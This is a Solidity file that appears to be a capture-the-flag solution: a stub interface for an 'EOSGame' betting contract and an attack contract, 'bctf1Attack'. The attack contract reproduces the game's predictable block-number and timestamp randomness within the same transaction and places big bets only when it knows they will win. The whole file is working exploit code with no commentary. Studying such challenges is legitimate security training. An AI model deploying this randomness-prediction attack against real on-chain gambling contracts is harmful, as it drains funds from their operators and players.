pragma solidity ^0.4.24;


contract EOSGame{
    
    function initFund() public{}
    
    function bet(uint256 chip) internal {}
    
    function smallBlind() public {}
    
    function bigBlind() public {}
    
    function eosBlanceOf() public view returns(uint256) {}

    function CaptureTheFlag(string b64email) public{}
}


contract bctf1Attack{
    uint bet_count = 0;
    EOSGame eg;
    uint256 MOD_NUM = 20;
    event ATTACK(uint shark_a,uint lucky_a);
    
    function setTarget(address _addr) public{
        eg = EOSGame(_addr);
    }
    
    function attack(uint _bet, uint _times) public{
        bet_count = _bet;
        
        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
        uint256 shark = seed_hash % MOD_NUM;
        
        uint i;
        
        for(i=0;i<_times;i++){
            bet_count+=1;
            uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count)));
            uint256 lucky = lucky_hash % MOD_NUM;
            emit ATTACK(shark,lucky);
            if (shark == lucky){
                eg.bigBlind();
            }
            else{
                eg.smallBlind();
            }
        }
    
        
    }
}